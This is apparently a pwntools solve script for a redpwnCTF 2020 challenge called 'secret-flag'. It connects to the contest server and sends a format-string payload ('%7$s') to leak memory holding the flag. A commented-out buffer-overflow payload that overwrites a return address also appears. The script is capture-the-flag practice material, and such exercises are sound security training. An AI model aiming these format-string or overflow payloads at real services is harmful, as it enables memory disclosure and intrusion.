#! /usr/bin/env python
from pwn import *

context(log_level ="debug")
p = remote( '2020.redpwnc.tf' , 31826 )
#p = process("./secret-flag")
#gdb.attach(p)
p.recvuntil('?')
#payload = b'a' * 24 + p64( 0x4006e6) +b'\n'
payload = b"%7$s\n";
p.send(payload)
p.recv(10)
p.interactive()


